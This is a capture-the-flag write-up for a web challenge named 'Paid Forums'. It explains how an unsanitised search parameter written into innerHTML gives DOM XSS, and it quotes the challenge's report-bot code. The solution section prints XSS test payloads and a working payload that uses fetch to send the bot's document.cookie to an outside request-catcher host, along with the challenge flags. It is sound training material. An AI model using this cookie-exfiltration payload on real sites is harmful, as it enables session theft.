# Challenge Name: Paid Forums

![Date](https://img.shields.io/badge/Date-31.08.2026-brightgreen.svg)  
![Category](https://img.shields.io/badge/Category-WEB-blueviolet.svg)  
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-blue.svg)  
![Value](https://img.shields.io/badge/Value-X-blue.svg)  

## Description

The law enforcement agencies have received a report of an illegal marketplace forum that was recently launched. Can you identify any sensitive information of the culprits running the website?

Files: 

## Detailed solution

Start by checking the app's home page 

<img width="1051" height="653" alt="image" src="https://github.com/user-attachments/assets/eceada3d-0f89-478b-950b-96b7b1fda9ad" />

We have some posts which we can check via `/posts/id` and also a search bar 

<img width="1153" height="416" alt="image" src="https://github.com/user-attachments/assets/1aba7127-bde4-4f88-a59a-9851bd215854" />

There's also a report feature with a specific field for `/posts/id`, so we can report a post 

<img width="1123" height="431" alt="image" src="https://github.com/user-attachments/assets/d60253a9-0ce1-49b5-93cb-8eaaaedc2306" />

The search bar reflects values from the `search` GET parameter  `?search=test`

<img width="340" height="110" alt="image" src="https://github.com/user-attachments/assets/49959304-7576-4320-8828-a9639978047a" />

The JavaScript code used is located at `/static/js/forum.js`

As we can see here, the code used for the search feature is only a static mockup, and the actual feature hasn't been added yet

```
	let params = parseParams(location.href);
	if (params.hasOwnProperty('search')) {
		$('#search-res').style.display = 'block';
		$('#search-msg').innerHTML = `Search results for "${params.search}" :`;
		// todo: add search feature
	}
```

The `parseParams` function is imported from `/static/js/parseParams.js`; it's just a basic parameter parser without any sanitization.

The search parameter value is used without sanitization, directly via innerHTML, which can be abused to inject malicious JavaScript, leading to cross-site scripting (XSS).

For example `?search=<h1>test</h1>` or `?search=<img%20src=x%20onerror=alert()>` to check for JavaScript execution

<img width="989" height="468" alt="image" src="https://github.com/user-attachments/assets/00ed3575-ab19-4aa7-b7b7-cd3d184a2a5e" />

<img width="492" height="395" alt="image" src="https://github.com/user-attachments/assets/4f62f6f4-d625-4c5e-b4a3-9e3b5dc6bfbd" />   


Now let's try to use this XSS against the report feature. Since we can't see the report ourselves, we need an external server to exfiltrate data from the other side. For example, using GET paths/parameters to extract cookies.

We can use the source code to confirm the solution

`challenge\routes\index.js`

```js
router.post('/api/report', async (req, res) => {
	const { id } = req.body;
	if (botVisiting) return res.status(403).send(response('Please wait for the previous report to process first!'));
	if(id) {
		botVisiting = true;
		return bot.visitPost(id)
			.then(() => {
				botVisiting = false;
				return res.send(response('Report received successfully!'));
			})
			.catch(e => {
				console.log(e);
				botVisiting = false;
				return res.status(403).send(response('Something went wrong, please try again!'));
			})
	}
	return res.status(500).send(response('Missing required parameters!'));
});
```

The `visitPost` function is imported from `challenge\bot.js`

```js
const visitPost = async (id) => {
    try {
		const browser = await puppeteer.launch(browser_options);
		let context = await browser.createIncognitoBrowserContext();
		let page = await context.newPage();
		await page.setCookie({
			name: "flag",
			'value': 'HTB{f4k3_fl4g_f0r_t3st1ng}',
			domain: "127.0.0.1:1337"
		});
		await page.goto(`http://127.0.0.1:1337/posts/${id}`, {
			waitUntil: 'networkidle2',
			timeout: 5000
		});
		await browser.close();
    } catch(e) {
        console.log(e);
    }
};
```

As we can see, the bot visits the reported post and sets the flag inside the cookies.

I used https://httpworkbench.com/ to exfiltrate the cookies using fetch `<img/src=x onerror=fetch('https://r4ne5inr.instances.httpworkbench.com/'+document.cookie)>`

On the /report page send this `3?search=<img/src=x%20onerror=fetch(%27https://ib7bb37d.instances.httpworkbench.com/%27%2bdocument.cookie)>` which will be used as id value in POST /api/report

Now let's check our server 

<img width="1576" height="630" alt="image" src="https://github.com/user-attachments/assets/5e19e50b-82bb-4283-9f7a-a90355e3622d" />

We got our flag.

## Flag

```
HTB{d0m_x55_f0r_th3_w1n}
```
